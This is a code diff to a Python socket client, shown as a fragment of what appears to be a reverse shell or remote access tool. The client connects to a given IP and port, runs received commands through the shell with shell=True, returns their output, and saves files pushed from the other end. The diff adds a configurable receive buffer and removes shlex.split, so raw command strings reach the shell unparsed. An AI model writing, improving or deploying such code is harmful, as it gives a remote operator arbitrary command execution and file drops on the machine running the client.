@@ -6,12 +6,13 @@ import shlex
 
 
 class Client:
-    def __init__(self, ip, port, verbose=True, loop=False):
+    def __init__(self, ip, port, verbose=True, loop=False, bufsz=8138):
         self.ip = ip
         self.port = port
         self.sock = socket.socket()
         self.loop = loop
         self.verbose = verbose
+        self.bufsz = bufsz
 
     def run(self):
         if self.loop:
@@ -80,13 +81,12 @@ class Client:
 
     def console(self, command):
         cmd = subprocess.Popen(
-            shlex.split(command),
+            command,
             shell=True,
             stdin=subprocess.PIPE,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE
         )
-        cmd.wait()
         stdout, stderr = cmd.communicate()
         output = b''
         if stdout:
@@ -99,10 +99,10 @@ class Client:
     def __shell(self):
         while True:
             try:
-                received = self.sock.recv(1024)
+                received = self.sock.recv(self.bufsz)
                 if received[:len(b"FILES")] == b"FILES":
                     while received[-1*len(b"CONN_END"):] != b"CONN_END":
-                        received += self.sock.recv(1024)
+                        received += self.sock.recv(self.bufsz)
                     self.save_files(received[len(b"FILES"):-1*len(b"CONN_END")])
                     self.sock.send((str(os.getcwd()) + "->").encode())
                     continue
